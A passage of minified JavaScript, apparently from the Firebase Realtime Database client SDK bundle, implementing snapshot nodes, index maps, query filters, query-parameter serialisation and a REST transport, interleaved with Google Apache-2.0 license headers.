 */const M3=Math.log(2);class L3{constructor(e){const n=s=>parseInt(Math.log(s)/M3,10),r=s=>parseInt(Array(s+1).join("1"),2);this.count=n(e+1),this.current_=this.count-1;const i=r(this.count);this.bits_=e+1&i}nextBitIsOne(){const e=!(this.bits_&1<<this.current_);return this.current_--,e}}const Ld=function(t,e,n,r){t.sort(e);const i=function(c,u){const p=u-c;let f,h;if(p===0)return null;if(p===1)return f=t[c],h=n?n(f):f,new st(h,f.node,st.BLACK,null,null);{const E=parseInt(p/2,10)+c,_=i(c,E),y=i(E+1,u);return f=t[E],h=n?n(f):f,new st(h,f.node,st.BLACK,_,y)}},s=function(c){let u=null,p=null,f=t.length;const h=function(_,y){const C=f-_,x=f;f-=_;const w=i(C+1,x),S=t[C],N=n?n(S):S;E(new st(N,S.node,y,null,w))},E=function(_){u?(u.left=_,u=_):(p=_,u=_)};for(let _=0;_<c.count;++_){const y=c.nextBitIsOne(),C=Math.pow(2,c.count-(_+1));y?h(C,st.BLACK):(h(C,st.BLACK),h(C,st.RED))}return p},o=new L3(t.length),a=s(o);return new Vt(r||e,a)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let dp;const Vs={};class Er{static get Default(){return B(Vs&&He,"ChildrenNode.ts has not been loaded"),dp=dp||new Er({".priority":Vs},{".priority":He}),dp}constructor(e,n){this.indexes_=e,this.indexSet_=n}get(e){const n=Uo(this.indexes_,e);if(!n)throw new Error("No index defined for "+e);return n instanceof Vt?n:null}hasIndex(e){return or(this.indexSet_,e.toString())}addIndex(e,n){B(e!==_o,"KeyIndex always exists and isn't meant to be added to the IndexMap.");const r=[];let i=!1;const s=n.getIterator(le.Wrap);let o=s.getNext();for(;o;)i=i||e.isDefinedOn(o.node),r.push(o),o=s.getNext();let a;i?a=Ld(r,e.getCompare()):a=Vs;const c=e.toString(),u=Object.assign({},this.indexSet_);u[c]=e;const p=Object.assign({},this.indexes_);return p[c]=a,new Er(p,u)}addToIndexes(e,n){const r=Sd(this.indexes_,(i,s)=>{const o=Uo(this.indexSet_,s);if(B(o,"Missing index implementation for "+s),i===Vs)if(o.isDefinedOn(e.node)){const a=[],c=n.getIterator(le.Wrap);let u=c.getNext();for(;u;)u.name!==e.name&&a.push(u),u=c.getNext();return a.push(e),Ld(a,o.getCompare())}else return Vs;else{const a=n.get(e.name);let c=i;return a&&(c=c.remove(new le(e.name,a))),c.insert(e,e.node)}});return new Er(r,this.indexSet_)}removeFromIndexes(e,n){const r=Sd(this.indexes_,i=>{if(i===Vs)return i;{const s=n.get(e.name);return s?i.remove(new le(e.name,s)):i}});return new Er(r,this.indexSet_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Ha;class te{static get EMPTY_NODE(){return Ha||(Ha=new te(new Vt(Yv),null,Er.Default))}constructor(e,n,r){this.children_=e,this.priorityNode_=n,this.indexMap_=r,this.lazyHash_=null,this.priorityNode_&&mT(this.priorityNode_),this.children_.isEmpty()&&B(!this.priorityNode_||this.priorityNode_.isEmpty(),"An empty node cannot have a priority")}isLeafNode(){return!1}getPriority(){return this.priorityNode_||Ha}updatePriority(e){return this.children_.isEmpty()?this:new te(this.children_,e,this.indexMap_)}getImmediateChild(e){if(e===".priority")return this.getPriority();{const n=this.children_.get(e);return n===null?Ha:n}}getChild(e){const n=ae(e);return n===null?this:this.getImmediateChild(n).getChild(ke(e))}hasChild(e){return this.children_.get(e)!==null}updateImmediateChild(e,n){if(B(n,"We should always be passing snapshot nodes"),e===".priority")return this.updatePriority(n);{const r=new le(e,n);let i,s;n.isEmpty()?(i=this.children_.remove(e),s=this.indexMap_.removeFromIndexes(r,this.children_)):(i=this.children_.insert(e,n),s=this.indexMap_.addToIndexes(r,this.children_));const o=i.isEmpty()?Ha:this.priorityNode_;return new te(i,o,s)}}updateChild(e,n){const r=ae(e);if(r===null)return n;{B(ae(e)!==".priority"||Fi(e)===1,".priority must be the last token in a path");const i=this.getImmediateChild(r).updateChild(ke(e),n);return this.updateImmediateChild(r,i)}}isEmpty(){return this.children_.isEmpty()}numChildren(){return this.children_.count()}val(e){if(this.isEmpty())return null;const n={};let r=0,i=0,s=!0;if(this.forEachChild(He,(o,a)=>{n[o]=a.val(e),r++,s&&te.INTEGER_REGEXP_.test(o)?i=Math.max(i,Number(o)):s=!1}),!e&&s&&i<2*r){const o=[];for(const a in n)o[a]=n[a];return o}else return e&&!this.getPriority().isEmpty()&&(n[".priority"]=this.getPriority().val()),n}hash(){if(this.lazyHash_===null){let e="";this.getPriority().isEmpty()||(e+="priority:"+pT(this.getPriority().val())+":"),this.forEachChild(He,(n,r)=>{const i=r.hash();i!==""&&(e+=":"+n+":"+i)}),this.lazyHash_=e===""?"":Hb(e)}return this.lazyHash_}getPredecessorChildName(e,n,r){const i=this.resolveIndex_(r);if(i){const s=i.getPredecessorKey(new le(e,n));return s?s.name:null}else return this.children_.getPredecessorKey(e)}getFirstChildName(e){const n=this.resolveIndex_(e);if(n){const r=n.minKey();return r&&r.name}else return this.children_.minKey()}getFirstChild(e){const n=this.getFirstChildName(e);return n?new le(n,this.children_.get(n)):null}getLastChildName(e){const n=this.resolveIndex_(e);if(n){const r=n.maxKey();return r&&r.name}else return this.children_.maxKey()}getLastChild(e){const n=this.getLastChildName(e);return n?new le(n,this.children_.get(n)):null}forEachChild(e,n){const r=this.resolveIndex_(e);return r?r.inorderTraversal(i=>n(i.name,i.node)):this.children_.inorderTraversal(n)}getIterator(e){return this.getIteratorFrom(e.minPost(),e)}getIteratorFrom(e,n){const r=this.resolveIndex_(n);if(r)return r.getIteratorFrom(e,i=>i);{const i=this.children_.getIteratorFrom(e.name,le.Wrap);let s=i.peek();for(;s!=null&&n.compare(s,e)<0;)i.getNext(),s=i.peek();return i}}getReverseIterator(e){return this.getReverseIteratorFrom(e.maxPost(),e)}getReverseIteratorFrom(e,n){const r=this.resolveIndex_(n);if(r)return r.getReverseIteratorFrom(e,i=>i);{const i=this.children_.getReverseIteratorFrom(e.name,le.Wrap);let s=i.peek();for(;s!=null&&n.compare(s,e)>0;)i.getNext(),s=i.peek();return i}}compareTo(e){return this.isEmpty()?e.isEmpty()?0:-1:e.isLeafNode()||e.isEmpty()?1:e===Ec?-1:0}withIndex(e){if(e===_o||this.indexMap_.hasIndex(e))return this;{const n=this.indexMap_.addIndex(e,this.children_);return new te(this.children_,this.priorityNode_,n)}}isIndexed(e){return e===_o||this.indexMap_.hasIndex(e)}equals(e){if(e===this)return!0;if(e.isLeafNode())return!1;{const n=e;if(this.getPriority().equals(n.getPriority()))if(this.children_.count()===n.children_.count()){const r=this.getIterator(He),i=n.getIterator(He);let s=r.getNext(),o=i.getNext();for(;s&&o;){if(s.name!==o.name||!s.node.equals(o.node))return!1;s=r.getNext(),o=i.getNext()}return s===null&&o===null}else return!1;else return!1}}resolveIndex_(e){return e===_o?null:this.indexMap_.get(e.toString())}}te.INTEGER_REGEXP_=/^(0|[1-9]\d*)$/;class F3 extends te{constructor(){super(new Vt(Yv),te.EMPTY_NODE,Er.Default)}compareTo(e){return e===this?0:1}equals(e){return e===this}getPriority(){return this}getImmediateChild(e){return te.EMPTY_NODE}isEmpty(){return!1}}const Ec=new F3;Object.defineProperties(le,{MIN:{value:new le(zo,te.EMPTY_NODE)},MAX:{value:new le(Is,Ec)}});fT.__EMPTY_NODE=te.EMPTY_NODE;rt.__childrenNodeConstructor=te;A3(Ec);D3(Ec);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const U3=!0;function et(t,e=null){if(t===null)return te.EMPTY_NODE;if(typeof t=="object"&&".priority"in t&&(e=t[".priority"]),B(e===null||typeof e=="string"||typeof e=="number"||typeof e=="object"&&".sv"in e,"Invalid priority type found: "+typeof e),typeof t=="object"&&".value"in t&&t[".value"]!==null&&(t=t[".value"]),typeof t!="object"||".sv"in t){const n=t;return new rt(n,et(e))}if(!(t instanceof Array)&&U3){const n=[];let r=!1;if(ht(t,(o,a)=>{if(o.substring(0,1)!=="."){const c=et(a);c.isEmpty()||(r=r||!c.getPriority().isEmpty(),n.push(new le(o,c)))}}),n.length===0)return te.EMPTY_NODE;const s=Ld(n,R3,o=>o.name,Yv);if(r){const o=Ld(n,He.getCompare());return new te(s,et(e),new Er({".priority":o},{".priority":He}))}else return new te(s,et(e),Er.Default)}else{let n=te.EMPTY_NODE;return ht(t,(r,i)=>{if(or(t,r)&&r.substring(0,1)!=="."){const s=et(i);(s.isLeafNode()||!s.isEmpty())&&(n=n.updateImmediateChild(r,s))}}),n.updatePriority(et(e))}}O3(et);/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class $3 extends Ph{constructor(e){super(),this.indexPath_=e,B(!ce(e)&&ae(e)!==".priority","Can't create PathIndex with empty path or .priority key")}extractChild(e){return e.getChild(this.indexPath_)}isDefinedOn(e){return!e.getChild(this.indexPath_).isEmpty()}compare(e,n){const r=this.extractChild(e.node),i=this.extractChild(n.node),s=r.compareTo(i);return s===0?Ms(e.name,n.name):s}makePost(e,n){const r=et(e),i=te.EMPTY_NODE.updateChild(this.indexPath_,r);return new le(n,i)}maxPost(){const e=te.EMPTY_NODE.updateChild(this.indexPath_,Ec);return new le(Is,e)}toString(){return Hl(this.indexPath_,0).join("/")}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class z3 extends Ph{compare(e,n){const r=e.node.compareTo(n.node);return r===0?Ms(e.name,n.name):r}isDefinedOn(e){return!0}indexedValueChanged(e,n){return!e.equals(n)}minPost(){return le.MIN}maxPost(){return le.MAX}makePost(e,n){const r=et(e);return new le(n,r)}toString(){return".value"}}const B3=new z3;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function yT(t){return{type:"value",snapshotNode:t}}function Bo(t,e){return{type:"child_added",snapshotNode:e,childName:t}}function Wl(t,e){return{type:"child_removed",snapshotNode:e,childName:t}}function Kl(t,e,n){return{type:"child_changed",snapshotNode:e,childName:t,oldSnap:n}}function V3(t,e){return{type:"child_moved",snapshotNode:e,childName:t}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qv{constructor(e){this.index_=e}updateChild(e,n,r,i,s,o){B(e.isIndexed(this.index_),"A node must be indexed if only a child is updated");const a=e.getImmediateChild(n);return a.getChild(i).equals(r.getChild(i))&&a.isEmpty()===r.isEmpty()||(o!=null&&(r.isEmpty()?e.hasChild(n)?o.trackChildChange(Wl(n,a)):B(e.isLeafNode(),"A child remove without an old child only makes sense on a leaf node"):a.isEmpty()?o.trackChildChange(Bo(n,r)):o.trackChildChange(Kl(n,r,a))),e.isLeafNode()&&r.isEmpty())?e:e.updateImmediateChild(n,r).withIndex(this.index_)}updateFullNode(e,n,r){return r!=null&&(e.isLeafNode()||e.forEachChild(He,(i,s)=>{n.hasChild(i)||r.trackChildChange(Wl(i,s))}),n.isLeafNode()||n.forEachChild(He,(i,s)=>{if(e.hasChild(i)){const o=e.getImmediateChild(i);o.equals(s)||r.trackChildChange(Kl(i,s,o))}else r.trackChildChange(Bo(i,s))})),n.withIndex(this.index_)}updatePriority(e,n){return e.isEmpty()?te.EMPTY_NODE:e.updatePriority(n)}filtersNodes(){return!1}getIndexedFilter(){return this}getIndex(){return this.index_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gl{constructor(e){this.indexedFilter_=new Qv(e.getIndex()),this.index_=e.getIndex(),this.startPost_=Gl.getStartPost_(e),this.endPost_=Gl.getEndPost_(e),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}getStartPost(){return this.startPost_}getEndPost(){return this.endPost_}matches(e){const n=this.startIsInclusive_?this.index_.compare(this.getStartPost(),e)<=0:this.index_.compare(this.getStartPost(),e)<0,r=this.endIsInclusive_?this.index_.compare(e,this.getEndPost())<=0:this.index_.compare(e,this.getEndPost())<0;return n&&r}updateChild(e,n,r,i,s,o){return this.matches(new le(n,r))||(r=te.EMPTY_NODE),this.indexedFilter_.updateChild(e,n,r,i,s,o)}updateFullNode(e,n,r){n.isLeafNode()&&(n=te.EMPTY_NODE);let i=n.withIndex(this.index_);i=i.updatePriority(te.EMPTY_NODE);const s=this;return n.forEachChild(He,(o,a)=>{s.matches(new le(o,a))||(i=i.updateImmediateChild(o,te.EMPTY_NODE))}),this.indexedFilter_.updateFullNode(e,i,r)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.indexedFilter_}getIndex(){return this.index_}static getStartPost_(e){if(e.hasStart()){const n=e.getIndexStartName();return e.getIndex().makePost(e.getIndexStartValue(),n)}else return e.getIndex().minPost()}static getEndPost_(e){if(e.hasEnd()){const n=e.getIndexEndName();return e.getIndex().makePost(e.getIndexEndValue(),n)}else return e.getIndex().maxPost()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class H3{constructor(e){this.withinDirectionalStart=n=>this.reverse_?this.withinEndPost(n):this.withinStartPost(n),this.withinDirectionalEnd=n=>this.reverse_?this.withinStartPost(n):this.withinEndPost(n),this.withinStartPost=n=>{const r=this.index_.compare(this.rangedFilter_.getStartPost(),n);return this.startIsInclusive_?r<=0:r<0},this.withinEndPost=n=>{const r=this.index_.compare(n,this.rangedFilter_.getEndPost());return this.endIsInclusive_?r<=0:r<0},this.rangedFilter_=new Gl(e),this.index_=e.getIndex(),this.limit_=e.getLimit(),this.reverse_=!e.isViewFromLeft(),this.startIsInclusive_=!e.startAfterSet_,this.endIsInclusive_=!e.endBeforeSet_}updateChild(e,n,r,i,s,o){return this.rangedFilter_.matches(new le(n,r))||(r=te.EMPTY_NODE),e.getImmediateChild(n).equals(r)?e:e.numChildren()<this.limit_?this.rangedFilter_.getIndexedFilter().updateChild(e,n,r,i,s,o):this.fullLimitUpdateChild_(e,n,r,s,o)}updateFullNode(e,n,r){let i;if(n.isLeafNode()||n.isEmpty())i=te.EMPTY_NODE.withIndex(this.index_);else if(this.limit_*2<n.numChildren()&&n.isIndexed(this.index_)){i=te.EMPTY_NODE.withIndex(this.index_);let s;this.reverse_?s=n.getReverseIteratorFrom(this.rangedFilter_.getEndPost(),this.index_):s=n.getIteratorFrom(this.rangedFilter_.getStartPost(),this.index_);let o=0;for(;s.hasNext()&&o<this.limit_;){const a=s.getNext();if(this.withinDirectionalStart(a))if(this.withinDirectionalEnd(a))i=i.updateImmediateChild(a.name,a.node),o++;else break;else continue}}else{i=n.withIndex(this.index_),i=i.updatePriority(te.EMPTY_NODE);let s;this.reverse_?s=i.getReverseIterator(this.index_):s=i.getIterator(this.index_);let o=0;for(;s.hasNext();){const a=s.getNext();o<this.limit_&&this.withinDirectionalStart(a)&&this.withinDirectionalEnd(a)?o++:i=i.updateImmediateChild(a.name,te.EMPTY_NODE)}}return this.rangedFilter_.getIndexedFilter().updateFullNode(e,i,r)}updatePriority(e,n){return e}filtersNodes(){return!0}getIndexedFilter(){return this.rangedFilter_.getIndexedFilter()}getIndex(){return this.index_}fullLimitUpdateChild_(e,n,r,i,s){let o;if(this.reverse_){const f=this.index_.getCompare();o=(h,E)=>f(E,h)}else o=this.index_.getCompare();const a=e;B(a.numChildren()===this.limit_,"");const c=new le(n,r),u=this.reverse_?a.getFirstChild(this.index_):a.getLastChild(this.index_),p=this.rangedFilter_.matches(c);if(a.hasChild(n)){const f=a.getImmediateChild(n);let h=i.getChildAfterChild(this.index_,u,this.reverse_);for(;h!=null&&(h.name===n||a.hasChild(h.name));)h=i.getChildAfterChild(this.index_,h,this.reverse_);const E=h==null?1:o(h,c);if(p&&!r.isEmpty()&&E>=0)return s!=null&&s.trackChildChange(Kl(n,r,f)),a.updateImmediateChild(n,r);{s!=null&&s.trackChildChange(Wl(n,f));const y=a.updateImmediateChild(n,te.EMPTY_NODE);return h!=null&&this.rangedFilter_.matches(h)?(s!=null&&s.trackChildChange(Bo(h.name,h.node)),y.updateImmediateChild(h.name,h.node)):y}}else return r.isEmpty()?e:p&&o(u,c)>=0?(s!=null&&(s.trackChildChange(Wl(u.name,u.node)),s.trackChildChange(Bo(n,r))),a.updateImmediateChild(n,r).updateImmediateChild(u.name,te.EMPTY_NODE)):e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xv{constructor(){this.limitSet_=!1,this.startSet_=!1,this.startNameSet_=!1,this.startAfterSet_=!1,this.endSet_=!1,this.endNameSet_=!1,this.endBeforeSet_=!1,this.limit_=0,this.viewFrom_="",this.indexStartValue_=null,this.indexStartName_="",this.indexEndValue_=null,this.indexEndName_="",this.index_=He}hasStart(){return this.startSet_}isViewFromLeft(){return this.viewFrom_===""?this.startSet_:this.viewFrom_==="l"}getIndexStartValue(){return B(this.startSet_,"Only valid if start has been set"),this.indexStartValue_}getIndexStartName(){return B(this.startSet_,"Only valid if start has been set"),this.startNameSet_?this.indexStartName_:zo}hasEnd(){return this.endSet_}getIndexEndValue(){return B(this.endSet_,"Only valid if end has been set"),this.indexEndValue_}getIndexEndName(){return B(this.endSet_,"Only valid if end has been set"),this.endNameSet_?this.indexEndName_:Is}hasLimit(){return this.limitSet_}hasAnchoredLimit(){return this.limitSet_&&this.viewFrom_!==""}getLimit(){return B(this.limitSet_,"Only valid if limit has been set"),this.limit_}getIndex(){return this.index_}loadsAllData(){return!(this.startSet_||this.endSet_||this.limitSet_)}isDefault(){return this.loadsAllData()&&this.index_===He}copy(){const e=new Xv;return e.limitSet_=this.limitSet_,e.limit_=this.limit_,e.startSet_=this.startSet_,e.startAfterSet_=this.startAfterSet_,e.indexStartValue_=this.indexStartValue_,e.startNameSet_=this.startNameSet_,e.indexStartName_=this.indexStartName_,e.endSet_=this.endSet_,e.endBeforeSet_=this.endBeforeSet_,e.indexEndValue_=this.indexEndValue_,e.endNameSet_=this.endNameSet_,e.indexEndName_=this.indexEndName_,e.index_=this.index_,e.viewFrom_=this.viewFrom_,e}}function W3(t){return t.loadsAllData()?new Qv(t.getIndex()):t.hasLimit()?new H3(t):new Gl(t)}function bx(t){const e={};if(t.isDefault())return e;let n;if(t.index_===He?n="$priority":t.index_===B3?n="$value":t.index_===_o?n="$key":(B(t.index_ instanceof $3,"Unrecognized index type!"),n=t.index_.toString()),e.orderBy=tt(n),t.startSet_){const r=t.startAfterSet_?"startAfter":"startAt";e[r]=tt(t.indexStartValue_),t.startNameSet_&&(e[r]+=","+tt(t.indexStartName_))}if(t.endSet_){const r=t.endBeforeSet_?"endBefore":"endAt";e[r]=tt(t.indexEndValue_),t.endNameSet_&&(e[r]+=","+tt(t.indexEndName_))}return t.limitSet_&&(t.isViewFromLeft()?e.limitToFirst=t.limit_:e.limitToLast=t.limit_),e}function Tx(t){const e={};if(t.startSet_&&(e.sp=t.indexStartValue_,t.startNameSet_&&(e.sn=t.indexStartName_),e.sin=!t.startAfterSet_),t.endSet_&&(e.ep=t.indexEndValue_,t.endNameSet_&&(e.en=t.indexEndName_),e.ein=!t.endBeforeSet_),t.limitSet_){e.l=t.limit_;let n=t.viewFrom_;n===""&&(t.isViewFromLeft()?n="l":n="r"),e.vf=n}return t.index_!==He&&(e.i=t.index_.toString()),e}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Fd extends cT{reportStats(e){throw new Error("Method not implemented.")}static getListenId_(e,n){return n!==void 0?"tag$"+n:(B(e._queryParams.isDefault(),"should have a tag if it's not a default query."),e._path.toString())}constructor(e,n,r,i){super(),this.repoInfo_=e,this.onDataUpdate_=n,this.authTokenProvider_=r,this.appCheckTokenProvider_=i,this.log_=xc("p:rest:"),this.listens_={}}listen(e,n,r,i){const s=e._path.toString();this.log_("Listen called for "+s+" "+e._queryIdentifier);const o=Fd.getListenId_(e,r),a={};this.listens_[o]=a;const c=bx(e._queryParams);this.restRequest_(s+".json",c,(u,p)=>{let f=p;if(u===404&&(f=null,u=null),u===null&&this.onDataUpdate_(s,f,!1,r),Uo(this.listens_,o)===a){let h;u?u===401?h="permission_denied":h="rest_error:"+u:h="ok",i(h,null)}})}unlisten(e,n){const r=Fd.getListenId_(e,n);delete this.listens_[r]}get(e){const n=bx(e._queryParams),r=e._path.toString(),i=new dc;return this.restRequest_(r+".json",n,(s,o)=>{let a=o;s===404&&(a=null,s=null),s===null?(this.onDataUpdate_(r,a,!1,null),i.resolve(a)):i.reject(new Error(a))}),i.promise}refreshAuthToken(e){}restRequest_(e,n={},r){return n.format="export",Promise.all([this.authTokenProvider_.getToken(!1),this.appCheckTokenProvider_.getToken(!1)]).then(([i,s])=>{i&&i.accessToken&&(n.auth=i.accessToken),s&&s.token&&(n.ac=s.token);const o=(this.repoInfo_.secure?"https://":"http://")+this.repoInfo_.host+e+"?ns="+this.repoInfo_.namespace+ra(n);this.log_("Sending REST request for "+o);const a=new XMLHttpRequest;a.onreadystatechange=()=>{if(r&&a.readyState===4){this.log_("REST Response for "+o+" received. status:",a.status,"response:",a.responseText);let c=null;if(a.status>=200&&a.status<300){try{c=Ul(a.responseText)}catch{At("Failed to parse JSON response for "+o+": "+a.responseText)}r(null,c)}else a.status!==401&&a.status!==404&&At("Got unsuccessful REST response for "+o+" Status: "+a.status),r(a.status);r=null}},a.open("GET",o,!0),a.send()})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class K3{constructor(){this.rootNode_=te.EMPTY_NODE}getNode(e){return this.rootNode_.getChild(e)}updateSnapshot(e,n){this.rootNode_=this.rootNode_.updateChild(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ud(){return{value:null,children:new Map}}function _T(t,e,n){if(ce(e))t.value=n,t.children.clear();else if(t.value!==null)t.value=t.value.updateChild(e,n);else{const r=ae(e);t.children.has(r)||t.children.set(r,Ud());const i=t.children.get(r);e=ke(e),_T(i,e,n)}}function Km(t,e,n){t.value!==null?n(e,t.value):G3(t,(r,i)=>{const s=new Se(e.toString()+"/"+r);Km(i,s,n)})}function G3(t,e){t.children.forEach((n,r)=>{e(r,n)})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class q3{constructor(e){this.collection_=e,this.last_=null}get(){const e=this.collection_.get(),n=Object.assign({},e);return this.last_&&ht(this.last_,(r,i)=>{n[r]=n[r]-i}),this.last_=e,n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ix=10*1e3,Y3=30*1e3,Q3=5*60*1e3;class X3{constructor(e,n){this.server_=n,this.statsToReport_={},this.statsListener_=new q3(e);const r=Ix+(Y3-Ix)*Math.random();hl(this.reportStats_.bind(this),Math.floor(r))}reportStats_(){const e=this.statsListener_.get(),n={};let r=!1;ht(e,(i,s)=>{s>0&&or(this.statsToReport_,i)&&(n[i]=s,r=!0)}),r&&this.server_.reportStats(n),hl(this.reportStats_.bind(this),Math.floor(Math.random()*2*Q3))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var An;(function(t){t[t.OVERWRITE=0]="OVERWRITE",t[t.MERGE=1]="MERGE",t[t.ACK_USER_WRITE=2]="ACK_USER_WRITE",t[t.LISTEN_COMPLETE=3]="LISTEN_COMPLETE"})(An||(An={}));function Jv(){return{fromUser:!0,fromServer:!1,queryId:null,tagged:!1}}function Zv(){return{fromUser:!1,fromServer:!0,queryId:null,tagged:!1}}function ey(t){return{fromUser:!1,fromServer:!0,queryId:t,tagged:!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
